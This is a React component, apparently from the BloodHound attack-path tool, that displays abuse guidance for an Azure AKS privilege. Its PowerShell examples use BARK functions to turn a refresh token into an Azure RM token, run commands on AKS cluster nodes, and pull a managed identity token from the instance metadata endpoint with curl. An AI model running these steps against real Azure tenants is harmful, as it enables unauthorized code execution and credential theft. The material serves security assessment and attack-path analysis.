// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                You can use BARK's Invoke-AzureRMAKSRunCommand function to execute commands on compute nodes associated
                with the target AKS Managed Cluster.
            </Typography>

            <Typography variant='body2'>
                This function requires you to supply an Azure Resource Manager scoped JWT associated with the principal
                that has the privilege to execute commands on the cluster. There are several ways to acquire a JWT. For
                example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying
                a refresh token:
            </Typography>

            <Typography component={'pre'}>
                {'$ARMToken = Get-ARMTokenWithRefreshToken `\n' +
                    '    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n' +
                    '    -TenantID "contoso.onmicrosoft.com"'}
            </Typography>

            <Typography variant='body2'>
                Now you can use BARK's Invoke-AzureRMAKSRunCommand function to execute a command against the target AKS
                Managed Cluster. For example, to run a simple "whoami" command:
            </Typography>

            <Typography component={'pre'}>
                {'Invoke-AzureRMAKSRunCommand `\n' +
                    '    -Token $ARMToken `\n' +
                    '    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `\n' +
                    '    -Command "whoami"'}
            </Typography>

            <Typography variant='body2'>
                If the AKS Cluster or its associated Virtual Machine Scale Sets have managed identity assignments, you
                can use BARK's Invoke-AzureRMAKSRunCommand function to retrieve a JWT for the managed identity Service
                Principal like this:
            </Typography>

            <Typography component={'pre'}>
                {'Invoke-AzureRMAKSRunCommand `\n' +
                    '    -Token $ARMToken `\n' +
                    '    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `\n' +
                    '    -Command \'curl -i -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01"\''}
            </Typography>

            <Typography variant='body2'>
                If successful, the output will include a JWT for the managed identity service principal.
            </Typography>
        </>
    );
};

export default Abuse;
